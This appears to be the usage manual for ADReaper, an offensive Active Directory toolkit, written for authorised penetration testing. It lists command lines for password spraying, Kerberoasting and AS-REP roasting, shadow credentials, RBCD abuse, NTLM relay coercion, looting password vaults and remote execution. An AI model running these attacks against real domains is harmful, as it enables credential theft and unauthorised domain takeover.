# 💀 ADREAPER: The Definitive Active Directory Attack & Recon Manual ⚔️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.2.0
```

**ADReaper** is a professional-grade, multi-threaded Active Directory reconnaissance and exploitation toolkit. This manual provides an exhaustive reference for every command, flag, and tactical capability within the engine.

---

## 📑 Table of Contents
1. [Global Configuration](#-global-configuration)
2. [Phase 1: Infrastructure Discovery (INFRA)](#-phase-1-infrastructure-discovery-infra)
3. [Phase 2: Object & Policy Enumeration (ENUM)](#-phase-2-object--policy-enumeration-enum)
4. [Phase 3: Tactical Exploitation (ATTACK)](#-phase-3-tactical-exploitation-attack)
5. [Phase 4: BloodHound Graph Analysis](#-phase-4-bloodhound-graph-analysis)
6. [Phase 5: Authentic Remote Execution (EXEC)](#-phase-5-authentic-remote-execution-exec)
7. [Phase 6: Advanced Autopilot & CVE Modules](#-phase-6-advanced-autopilot--cve-modules)
8. [Reporting & Workspace Intelligence](#-reporting--workspace-intelligence)

---

## ⚙️ Global Configuration

These flags are persistent across all modules except where specified.

| Flag | Shorthand | Description | Default |
| :--- | :--- | :--- | :--- |
| `--domain` | `-d` | Target AD Domain (e.g. lab.local) | Required |
| `--username` | `-u` | Authentication Username | Guest/None |
| `--password` | `-p` | Authentication Password | None |
| `--dc-ip` | | IP address of the Domain Controller | Auto-detect |
| `--hash` | | NTLM Hash (LM:NT) for Pass-the-Hash | None |
| `--output` | `-o` | Base directory for evidence & reports | `./workspace` |
| `--verbose` | `-v` | Enable high-verbosity debug logging | `false` |
| `--json` | | Export results directly to JSON | `false` |
| `--ldaps` | | Use LDAP over SSL (Port 636) | `false` |

---

## 🔍 Phase 1: Infrastructure Discovery (INFRA)

The infrastructure module is designed for the initial entry phase of an engagement.

### `infra scan` - Port Scanning & Service Fingerprinting
```powershell
# Standard scan against a DC
.\adreaper.exe infra scan -t 192.168.3.10

# All-ports scan with aggressive fingerprinting (Nmap-style)
.\adreaper.exe infra scan -t 192.168.3.10 --ports all -A

# Fast scan of specific ports (SMB, LDAP, Kerberos, RDP)
.\adreaper.exe infra scan -t 192.168.3.10 --ports 445,389,88,3389

# Stealth Mode: No-ping host discovery
.\adreaper.exe infra scan -t 192.168.3.10 -Pn

# Save results to a text-based report
.\adreaper.exe infra scan -t 192.168.3.10 --save results.txt
```

### `infra dns` - Service Record Discovery
```powershell
# Auto-discover all LDAP, Kerberos, and GC servers via SRV records
.\adreaper.exe infra dns -d lab.local

# Verbose DNS enumeration across subdomains
.\adreaper.exe infra dns -d lab.local -v
```

---

## 👤 Phase 2: Object & Policy Enumeration (ENUM)

Deep-dive into the Active Directory database.

### `enum users` - Identity Recon
```powershell
# List ALL domain users with basic attributes
.\adreaper.exe enum users -d lab.local -u user -p pass

# Target: Find Kerberoastable accounts (SPN set)
.\adreaper.exe enum users -d lab.local --spn-only

# Target: Find AS-REP Roastable accounts (No Pre-Auth)
.\adreaper.exe enum users -d lab.local --asrep-only

# Target: Find High-Value accounts (AdminCount=1)
.\adreaper.exe enum users -d lab.local --admin-only

# Target: Find Delegation misconfigurations (Unconstrained/Constrained)
.\adreaper.exe enum users -d lab.local --deleg
```

### `enum domain` - Policy & Forest Recon
```powershell
# Extract Domain Functional Level, Password Policy, and Lockout Threshold
.\adreaper.exe enum domain -d lab.local --dc-ip 192.168.3.10

# Analyze ms-DS-MachineAccountQuota for NoPac/Relay attacks
.\adreaper.exe enum domain -d lab.local -v
```

### `enum computers` - Network Inventory
```powershell
# List all computer accounts and their OS versions
.\adreaper.exe enum computers -d lab.local -u user -p pass

# Identify Domain Controllers and LAPS-enabled machines
.\adreaper.exe enum computers -d lab.local --verbose
```

### `enum groups` - Privilege Mapping
```powershell
# List all groups and count their members
.\adreaper.exe enum groups -d lab.local

# Search for specific group members (e.g. Domain Admins)
.\adreaper.exe enum groups --name "Domain Admins" -d lab.local
```

### `enum tree` - SMB Filesystem Exploration
```powershell
# List all shares on the target
.\adreaper.exe enum shares -t DC01 -d lab.local

# Map a visual tree of the 'SYSVOL' share
.\adreaper.exe enum tree -s "SYSVOL" -d lab.local -u user -p pass

# Map a visual tree of 'C$' with depth limit
.\adreaper.exe enum tree -s "C$" --depth 2 -d lab.local

# Map the entire host (Global view)
.\adreaper.exe enum tree -d lab.local -u user -p pass
```

### `enum adcs` - Certificate Services (PKI)
```powershell
# Discover CAs and vulnerable Certificate Templates (ESC1-ESC4)
.\adreaper.exe enum adcs -d lab.local -u user -p pass
```

---

## ⚔️ Phase 3: Tactical Exploitation (ATTACK)

The weaponized modules of ADReaper.

### `attack spray` - Authenticated Password Spraying
```powershell
# Spray a single password against all domain users with a 5s delay
.\adreaper.exe attack spray -P "Winter2024!" -d lab.local --delay 5

# Spray using a custom users file
.\adreaper.exe attack spray -U users.txt -P "Password123!" -d lab.local
```

### `attack kerberoast` - TGS Hash Extraction
```powershell
# Extract hashes for all Kerberoastable (SPN) accounts
.\adreaper.exe attack kerberoast -d lab.local -u user -p pass -o hashes.txt
```

### `attack asreproast` - AS-REP Hash Extraction
```powershell
# Extract hashes for accounts without Kerberos Pre-Auth
.\adreaper.exe attack asreproast -d lab.local -o asrep_hashes.txt

# Target specific users from a file
.\adreaper.exe attack asreproast -U roast_targets.txt -d lab.local
```

### `attack shadow` - Shadow Credentials (KeyCredentialLink)
```powershell
# Inject KeyCredentialLink for a target computer takeover
.\adreaper.exe attack shadow -t SQLSERVER01 -u user -p pass -d lab.local
```

### `attack rbcd` - Resource-Based Constrained Delegation
```powershell
# Configure RBCD on SRV01 to allow ATTACK_PC$ to impersonate admins
.\adreaper.exe attack rbcd -t SRV01 -M ATTACK_PC$ -u user -p pass
```

### `attack gpp` - Group Policy Preference Decryption
```powershell
# Search SYSVOL for Groups.xml and decrypt 'cpassword' attributes
.\adreaper.exe attack gpp -d lab.local -u user -p pass
```

### `attack relay` - NTLM Relay Triggers
```powershell
# Trigger PetitPotam (MS-EFSR) to force machine authentication
.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.0.0.5

# Trigger PrinterBug (MS-RPRN)
.\adreaper.exe attack relay -t DC01 -m printerbug --listener 10.0.0.5
```

### `attack harvest` - Sensitive File Collection
```powershell
# Search and download .kdbx and .config files from all shares
.\adreaper.exe attack harvest -e kdbx,config -d lab.local -u user -p pass
```

---

## 🩸 Phase 4: BloodHound Graph Analysis

Native collection and ingestion engine.

### `bloodhound collect` - SharpHound Compatibility
```powershell
# Full collection of domain objects and ACLs
.\adreaper.exe bloodhound collect -d lab.local --dc-ip 192.168.3.10 -u user -p pass
```

### `bloodhound ingest` - Direct Neo4j Pipe
```powershell
# Ingest data directly into a local or remote Neo4j instance
.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass "BloodHound123"
```

---

## 🌌 Phase 5: Authentic Remote Execution (EXEC)

Protocol-level command execution (No simulated output).

### `exec` - PSEXEC-Style Execution
```powershell
# Run 'whoami /all' on a remote machine
.\adreaper.exe "whoami /all" -t 192.168.3.10 -d lab.local -u admin -p pass

# Run a full 'systeminfo' report
.\adreaper.exe "systeminfo" -t 192.168.3.10 -d lab.local -u admin -p pass

# Check active network connections
.\adreaper.exe "netstat -ano" -t 192.168.3.10 -u admin -p pass
```

---

## 🤖 Phase 6: Advanced Autopilot & CVE Modules

### `autopilot` - Orchestrated Attacks
```powershell
# Run Phase 1 (Initial Recon) automatically
.\adreaper.exe autopilot --phase 1 -d lab.local

# Run Phase 5 (Full Domination - Kerberoast + GPP + RBCD)
.\adreaper.exe autopilot --phase 5 -d lab.local -u user -p pass
```

### `cve` - Exploit Readiness
```powershell
# Check for CVE-2021-42278 (NoPac) readiness
.\adreaper.exe cve nopac -d lab.local

# Check for ZeroLogon (CVE-2020-1472)
.\adreaper.exe cve zerologon -t DC01
```

---

## 📈 Reporting & Workspace Intelligence

ADReaper manages all evidence in a unified workspace.

### Workspace Directory Structure
```text
workspace/
├── report.html        <-- Premium Interactive Dashboard
├── artifacts/         <-- Raw JSON/TXT outputs
├── loot/              <-- Harvested files (.kdbx, .config)
└── bloodhound/        <-- SharpHound-ready JSONs
```

### The Premium HTML Dashboard
To view your mission results:
1. Open `workspace/report.html` in any browser.
2. The dashboard automatically discovers all findings in the workspace.
3. Use the **Universal JSON Viewer** to explore every detail of the enumerated objects.

---

## 🧱 Architecture Details

- **Binary Portability**: Written in Go, ADReaper is a single binary that runs on Windows, Linux, and macOS without external dependencies.
- **Protocol Fidelity**: ADReaper implements the raw SMB2, LDAP, and Kerberos protocols. It does not wrap `net.exe` or `powershell.exe`.
- **Concurrency Model**: High-performance worker pools for port scanning and file harvesting ensure maximum speed in large environments.

---

## 📜 Legal & Ethical Warning
ADReaper is a powerful security testing tool. It must only be used on systems where you have explicit, written permission from the owner. Unauthorized access to computer systems is illegal and unethical.

---
**Crafted for the elite. Use with precision.** 🛡️⚔️🔥
